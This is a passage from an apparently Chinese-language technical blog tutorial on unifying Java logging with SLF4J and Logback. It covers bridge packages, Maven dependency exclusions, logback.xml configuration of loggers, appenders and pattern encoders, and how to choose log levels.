        Slf4jApi[&quot;slf4j-api (门面)&quot;]:::api
    end
    
    subgraph &quot;日志实现[日志实现 (Implementation)]&quot;
        LogbackBinding[&quot;logback-classic (绑定)&quot;]:::logback
        LogbackImpl[&quot;Logback 实现&lt;br&gt;(写入文件/控制台等)&quot;]:::logback
        LogbackConfig[&quot;logback.xml&lt;br&gt;(统一配置)&quot;]:::logback
    end

    %% 中心节点
    SLF4J_Core[&quot;SLF4J 核心&quot;]:::slf4jCore

    %% 定义连接关系
    %% 第三方库的日志流
    LibA --&gt;|1.调用| Log4jApi
    Log4jApi --&gt;|2.被桥接| Log4jBridge --&gt;|3.路由到| SLF4J_Core

    LibB --&gt;|1.调用| JclApi
    JclApi --&gt;|2.被桥接| JclBridge --&gt;|3.路由到| SLF4J_Core

    LibC --&gt;|1.调用| JulApi
    JulApi --&gt;|2.被拦截| JulBridge --&gt;|3.路由到| SLF4J_Core

    %% 你的应用的日志流
    MyApp --&gt;|A. 调用| Slf4jApi --&gt;|B.委托给| SLF4J_Core

    %% SLF4J核心到最终实现
    SLF4J_Core --&gt;|4.发现并绑定| LogbackBinding
    LogbackBinding --&gt;|5.执行日志记录| LogbackImpl
    LogbackConfig -.-&gt;|6.配置| LogbackBinding</code></pre>

<hr>
<h4 id="4-1-2-实现步骤：三步走策略"><a href="#4-1-2-实现步骤：三步走策略" class="headerlink" title="4.1.2 实现步骤：三步走策略"></a>4.1.2 实现步骤：三步走策略</h4><p>要实现上述目标，我们需要遵循一个清晰的三步策略。</p>
<p><strong>第一步：确立核心技术栈（推荐组合）</strong></p>
<p>首先，为项目选择一套统一的日志框架组合。业界最主流、最推荐的选择是：</p>
<ul>
<li><strong><code>SLF4J + Logback</code></strong>：黄金搭档，Spring Boot 默认选择，稳定、高效、配置简单，社区生态完善，适用于绝大多数项目。</li>
<li><strong><code>SLF4J + Log4j 2</code></strong>：追求极致性能的选择，尤其适合需要高吞吐量、低延迟异步日志的场景。</li>
</ul>
<p><strong>第二步：项目中只依赖 <code>slf4j-api</code></strong></p>
<p>这是统一日志的“黄金法则”。在自己的业务代码中，<strong>永远只引入和使用 <code>slf4j-api</code></strong>。不要让任何具体的日志实现（如 Logback 或 Log4j 2 的 API）侵入到你的业务逻辑中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正确的姿势</span></span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(MyService.class);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>第三步：清理、桥接外部依赖</strong></p>
<p>这是最关键的一步，目的是将所有第三方库的日志调用“收编”到 SLF4J 体系下。</p>
<ol>
<li><p><strong>排除传递性日志实现依赖</strong>：<br>使用 Maven 或 Gradle 的依赖分析工具（如 <code>mvn dependency:tree</code>）找出所有第三方库传递进来的<strong>日志实现</strong>包（如 <code>commons-logging</code>, <code>log4j:log4j</code>, <code>logback-classic</code> 等），并使用 <code>&lt;exclusion&gt;</code> 标签将它们<strong>全部排除</strong>掉。</p>
<p><strong>示例 (Maven <code>pom.xml</code>)</strong>:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.x<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Spring 框架默认依赖 JCL，我们必须排除它 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>使用 SLF4J 的桥接包</strong>：<br>针对你排除了哪些日志框架，就引入对应的 SLF4J 桥接包。这些桥接包会“冒充”原始的日志框架，拦截其 API 调用，并将其转发给 SLF4J。</p>
<ul>
<li>排除了 <code>commons-logging</code> -&gt; 引入 <code>jcl-over-slf4j</code></li>
<li>排除了 <code>log4j:log4j</code> -&gt; 引入 <code>log4j-over-slf4j</code></li>
<li>需要接管 <code>java.util.logging</code> -&gt; 引入 <code>jul-to-slf4j</code></li>
</ul>
</li>
</ol>
<hr>
<h4 id="4-1-3-示例"><a href="#4-1-3-示例" class="headerlink" title="4.1.3 示例"></a>4.1.3 示例</h4><p>假设我们选择 <code>SLF4J + Logback</code> 作为我们的技术栈，下面是一个典型的 <code>pom.xml</code> 依赖配置，它完整地展示了如何实现日志体系的统一：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slf4j.version</span>&gt;</span>1.7.32<span class="tag">&lt;/<span class="name">slf4j.version</span>&gt;</span> <span class="comment">&lt;!-- 使用一个统一的 SLF4J 版本 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logback.version</span>&gt;</span>1.2.9<span class="tag">&lt;/<span class="name">logback.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 1. 引入 SLF4J 核心 API (所有代码都应依赖这个) --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;slf4j.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 2. 引入唯一的日志实现和 SLF4J 绑定器 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Logback 已经内置了 SLF4J 绑定 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;logback.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;logback.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 3. 引入桥接包，替换掉其他日志框架 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 桥接 JCL (如 Spring 框架) --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jcl-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;slf4j.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 桥接 Log4j 1.x (许多老旧库) --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;slf4j.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 桥接 java.util.logging (JUL) --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jul-to-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;slf4j.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 4. 在引入第三方库时，记得排除其自带的日志实现 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>some.old.library<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>legacy-lib<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过以上配置，无论项目中的哪个模块、哪个第三方库尝试记录日志，其调用最终都会被汇集到 SLF4J，并由 Logback 按照我们唯一的 <code>logback.xml</code> 配置文件进行处理。至此，一个干净、健壮、易于管理的统一日志体系就建立起来了。</p>
<hr>
<h3 id="4-2-核心配置详解"><a href="#4-2-核心配置详解" class="headerlink" title="4.2 核心配置详解"></a>4.2 核心配置详解</h3><p>任何一个主流的日志框架配置都由这三个基本组件构成。它们共同回答了三个问题：</p>
<ul>
<li><strong>Logger</strong>: <strong>记录什么内容？</strong> (以及什么级别的日志应该被记录)</li>
<li><strong>Appender</strong>: <strong>记录到哪里去？</strong></li>
<li><strong>Layout&#x2F;Encoder</strong>: <strong>以什么格式记录？</strong></li>
</ul>
<h4 id="4-2-1-Logger-记录器"><a href="#4-2-1-Logger-记录器" class="headerlink" title="4.2.1 Logger (记录器)"></a>4.2.1 Logger (记录器)</h4><p>Logger 是日志配置的入口点。你可以把它想象成一个带有<strong>命名空间</strong>和<strong>级别开关</strong>的组件。</p>
<ul>
<li><strong>命名空间 (Namespace)</strong>：<br>Logger 是按<strong>名称</strong>组织的，并且这些名称是<strong>分层的</strong>，与 Java 的包名结构非常相似。例如，名为 <code>com.mycompany.service</code> 的 Logger 是名为 <code>com.mycompany</code> 的 Logger 的子级。这种层级结构允许我们进行精细化的控制。</li>
<li><strong>级别 (Level)</strong>：<br>Logger 拥有一个日志级别，它充当一个<strong>过滤器</strong>。只有当日志事件的级别<strong>等于或高于</strong> Logger 配置的级别时，该事件才会被处理。级别从低到高依次为：<code>ALL</code> &lt; <code>TRACE</code> &lt; <code>DEBUG</code> &lt; <code>INFO</code> &lt; <code>WARN</code> &lt; <code>ERROR</code> &lt; <code>OFF</code>。<ul>
<li><strong>继承性</strong>：子 Logger 如果没有显式配置级别，它会继承父 Logger 的级别。所有 Logger 最终都继承自根记录器 <code>root</code>。</li>
</ul>
</li>
<li><strong>关联 Appender</strong>：<br>一个 Logger 可以关联一个或多个 Appender。当一个日志事件通过了级别检查，它就会被发送到所有与该 Logger 关联的 Appender。</li>
<li><strong><code>additivity</code> 属性 (重要)</strong>：<br>默认情况下，日志事件除了被发送到当前 Logger 关联的 Appender 外，还会<strong>向上级 Logger 传递</strong>，最终到达 <code>root</code>。<code>additivity=&quot;false&quot;</code> 可以阻止这种向上传递的行为，避免日志重复记录。</li>
</ul>
<p><strong>配置示例 (<code>logback.xml</code>)：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 根记录器，所有 Logger 的最终祖先 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 将所有 INFO 及以上级别的日志，默认输出到名为 CONSOLE 的 Appender --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 为 &#x27;com.mycompany.service&#x27; 包下的类定义一个特定的 Logger --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- level=&quot;DEBUG&quot; 意味着这个包下的日志将从 DEBUG 级别开始记录 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- additivity=&quot;false&quot; 表示日志只输出到此 Logger 关联的 &#x27;SERVICE_FILE&#x27; Appender，不再向上传递给 root，避免在总文件 FILE 中重复记录 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;com.mycompany.service&quot;</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span> <span class="attr">additivity</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;SERVICE_FILE&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="4-2-2-Appender-输出源"><a href="#4-2-2-Appender-输出源" class="headerlink" title="4.2.2 Appender (输出源)"></a>4.2.2 Appender (输出源)</h4><p>Appender 定义了日志事件最终被写入的位置。它是日志输出的执行者。</p>
<ul>
<li><strong><code>ConsoleAppender</code></strong><ul>
<li><strong>作用</strong>：将日志输出到控制台 (<code>System.out</code> 或 <code>System.err</code>)。</li>
<li><strong>场景</strong>：开发环境中最常用，便于实时查看日志。</li>
</ul>
</li>
<li><strong><code>FileAppender</code></strong><ul>
<li><strong>作用</strong>：将日志写入到一个文件中。</li>
<li><strong>缺点</strong>：文件会无限增长，不适合生产环境。</li>
</ul>
</li>
<li><strong><code>RollingFileAppender</code></strong> (生产环境必备)<ul>
<li><strong>作用</strong>：<code>FileAppender</code> 的增强版，可以按照特定策略对日志文件进行<strong>滚动（归档）</strong>，避免单个文件过大。</li>
<li><strong>滚动策略</strong>：<ul>
<li><strong>基于时间 (<code>TimeBasedRollingPolicy</code>)</strong>：每天、每小时生成一个新的日志文件。例如 <code>app.%d{yyyy-MM-dd}.log</code>。</li>
<li><strong>基于大小 (<code>SizeAndTimeBasedFNATP</code>)</strong>：当文件达到指定大小时（如 <code>10MB</code>），就进行滚动。通常与时间策略结合使用。</li>
</ul>
</li>
<li><strong>归档管理</strong>：可以配置历史日志文件的保留数量或保留天数 (<code>maxHistory</code>)，自动删除旧的日志文件。</li>
</ul>
</li>
<li><strong><code>KafkaAppender</code> (高级)</strong><ul>
<li><strong>作用</strong>：将日志消息作为事件直接发送到 Apache Kafka 集群。</li>
<li><strong>场景</strong>：构建集中式日志平台（如 ELK&#x2F;EFK Stack）的常用方式。应用程序将日志推送到 Kafka，后续由 Logstash 或 Fluentd 等工具消费并存入 Elasticsearch。</li>
</ul>
</li>
<li><strong><code>DBAppender</code> (高级)</strong><ul>
<li><strong>作用</strong>：将日志记录持久化到数据库的表中。</li>
<li><strong>场景</strong>：适用于需要对日志进行结构化查询和审计的场景。但性能开销较大，通常需要配合异步处理。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="4-2-3-Layout-Encoder-布局-编码器"><a href="#4-2-3-Layout-Encoder-布局-编码器" class="headerlink" title="4.2.3 Layout &#x2F; Encoder (布局&#x2F;编码器)"></a>4.2.3 Layout &#x2F; Encoder (布局&#x2F;编码器)</h4><p>Layout&#x2F;Encoder 负责将日志事件（一个包含时间戳、级别、消息等信息的对象）转换成可读的、特定格式的字符串或字节流。</p>
<ul>
<li><strong>Layout vs. Encoder (Logback概念)</strong><ul>
<li><code>Layout</code>：将事件转换为 <code>String</code>。</li>
<li><code>Encoder</code>：将事件转换为 <code>byte[]</code> 并写入 <code>OutputStream</code>。在写入文件或控制台时，我们通常使用 <code>Encoder</code>，因为它更高效且能处理字符集编码。</li>
</ul>
</li>
<li><strong><code>PatternLayout</code> &#x2F; <code>PatternLayoutEncoder</code></strong><br>这是<strong>最常用、最强大</strong>的格式化工具。它允许你通过一个类似 <code>printf</code> 的格式化字符串（<strong>pattern</strong>）来定义日志输出格式。</li>
</ul>
<p><strong>常用格式化占位符 (Conversion Word)：</strong></p>
<table>
<thead>
<tr>
<th align="left">占位符</th>
<th align="left">描述</th>
<th align="left">示例输出</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>%d</code> 或 <code>%date</code></td>
<td align="left">日期和时间。可指定格式，如 <code>%d{yyyy-MM-dd HH:mm:ss.SSS}</code></td>
<td align="left"><code>2023-10-27 10:30:00.123</code></td>
</tr>
<tr>
<td align="left"><code>%thread</code></td>
<td align="left">当前线程名。</td>
<td align="left"><code>[http-nio-8080-exec-1]</code></td>
</tr>
<tr>
<td align="left"><code>%-5level</code></td>
<td align="left">日志级别，左对齐，宽度为5。</td>
<td align="left"><code>INFO </code>, <code>DEBUG</code>, <code>WARN </code>, <code>ERROR</code></td>
</tr>
<tr>
<td align="left"><code>%logger{length}</code></td>
<td align="left">Logger 名称。<code>{length}</code> 可用于缩写，如<code>{36}</code>表示最多36个字符。</td>
<td align="left"><code>c.m.service.UserService</code></td>
</tr>
<tr>
<td align="left"><code>%msg</code> 或 <code>%message</code></td>
<td align="left">核心的日志消息。</td>
<td align="left"><code>User logged in successfully</code></td>
</tr>
<tr>
<td align="left"><code>%n</code></td>
<td align="left">换行符。</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>%X{key}</code></td>
<td align="left">输出 MDC (Mapped Diagnostic Context) 中指定 key 的值。</td>
<td align="left"><code>traceId=abcde12345</code></td>
</tr>
<tr>
<td align="left"><code>%M</code>, <code>%L</code>, <code>%C</code></td>
<td align="left">方法名、行号、类名。<strong>警告：性能开销极大，避免在生产环境中使用！</strong></td>
<td align="left"><code>login</code>, <code>125</code>, <code>...UserService</code></td>
</tr>
</tbody></table>
<p><strong>配置示例 (<code>logback.xml</code>)：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CONSOLE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.classic.encoder.PatternLayoutEncoder&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 定义日志格式 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 格式：时间 [线程] 级别 Logger名称 - 消息 换行 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">charset</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span> <span class="comment">&lt;!-- 指定编码 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个配置会产生如下格式的日志：<code>2023-10-27 10:30:00.123 [main] INFO com.mycompany.Application - Starting application...</code></p>
<hr>
<h3 id="4-3-日志级别管理"><a href="#4-3-日志级别管理" class="headerlink" title="4.3 日志级别管理"></a>4.3 日志级别管理</h3><p>日志级别是控制日志输出<strong>粒度</strong>和<strong>数量</strong>的核心机制。它就像一个阀门，允许我们根据不同的运行环境和需求，精确地决定哪些信息需要被记录，哪些应该被忽略。正确地使用和管理日志级别，是在<strong>信息详尽</strong>（便于排查问题）和<strong>性能开销&#x2F;存储成本</strong>之间取得平衡的关键。</p>
<h4 id="4-3-1-日志级别的层次与选择"><a href="#4-3-1-日志级别的层次与选择" class="headerlink" title="4.3.1 日志级别的层次与选择"></a>4.3.1 日志级别的层次与选择</h4><p>主流日志框架都定义了一套标准的日志级别。它们是<strong>有序的</strong>，从低到高（从最详细到最不详细）依次为：</p>
<p><code>ALL</code> &lt; <strong><code>TRACE</code></strong> &lt; <strong><code>DEBUG</code></strong> &lt; <strong><code>INFO</code></strong> &lt; <strong><code>WARN</code></strong> &lt; <strong><code>ERROR</code></strong> &lt; <code>OFF</code></p>
<p>当一个 Logger 被设置为某个级别时，它只会记录<strong>级别等于或高于</strong>它自身级别的日志事件。</p>
<ul>
<li>例如，如果 Logger 级别是 <code>INFO</code>，那么 <code>INFO</code>, <code>WARN</code>, <code>ERROR</code> 级别的日志会被记录，而 <code>TRACE</code> 和 <code>DEBUG</code> 级别的日志将被<strong>忽略</strong>。</li>
</ul>
<p><strong>如何选择合适的级别（编码时的最佳实践）：</strong></p>
<ul>
<li><strong><code>ERROR</code></strong>: <strong>严重错误，影响了核心功能的正常执行。</strong><ul>
<li><strong>何时使用</strong>：当发生了阻止当前操作继续进行的严重问题时。这通常是意料之外的异常，需要立即引起注意和处理。</li>
<li><strong>示例</strong>：数据库连接失败、关键外部接口调用失败、处理支付请求时发生 <code>NullPointerException</code>、无法写入重要数据等。</li>
<li><strong>目标读者</strong>：运维人员、开发人员（通常会触发告警）。</li>
</ul>
</li>
<li><strong><code>WARN</code></strong>: <strong>警告，出现了非预期的或潜在的问题，但应用仍可继续运行。</strong><ul>
<li><strong>何时使用</strong>：发生了不正常的情况，但不影响当前请求的主流程。这些日志值得关注，可能预示着未来的错误或性能问题。</li>
<li><strong>示例</strong>：某个非关键接口调用超时、尝试从缓存获取数据失败（回源到数据库）、某个方法的输入参数不规范（但程序做了兼容处理）、调用了一个已标记为“废弃”的接口。</li>
<li><strong>目标读者</strong>：运维人员、开发人员（用于问题排查和系统健康度监控）。</li>
</ul>
</li>
<li><strong><code>INFO</code></strong>: <strong>信息，记录应用运行过程中的关键节点和重要业务流程。</strong><ul>
<li><strong>何时使用</strong>：用于在生产环境中追踪应用的运行状态和业务进展。这些日志应该是简洁、有意义的，并且不应过于频繁。</li>
<li><strong>示例</strong>：应用启动&#x2F;关闭、收到一个HTTP请求、用户登录成功、订单创建成功、定时任务开始&#x2F;结束执行。</li>
<li><strong>目标读者</strong>：运维人员（用于监控）、业务&#x2F;数据分析人员。</li>
</ul>
</li>
<li><strong><code>DEBUG</code></strong>: <strong>调试，用于在开发和测试阶段详细诊断问题的日志。</strong><ul>
<li><strong>何时使用</strong>：记录用于调试的详细信息，如关键方法的入参和出参、重要变量的值、代码执行的分支路径等。<strong>在生产环境中，<code>DEBUG</code> 级别通常是关闭的。</strong></li>
<li><strong>示例</strong>：“Executing SQL query: [SELECT …]”, “User object retrieved from database: [User{id&#x3D;123, name&#x3D;’test’}]”, “Method <code>calculatePrice</code> entered with params: [price&#x3D;100, discount&#x3D;0.8]”。</li>
<li><strong>目标读者</strong>：开发人员。</li>
</ul>
</li>
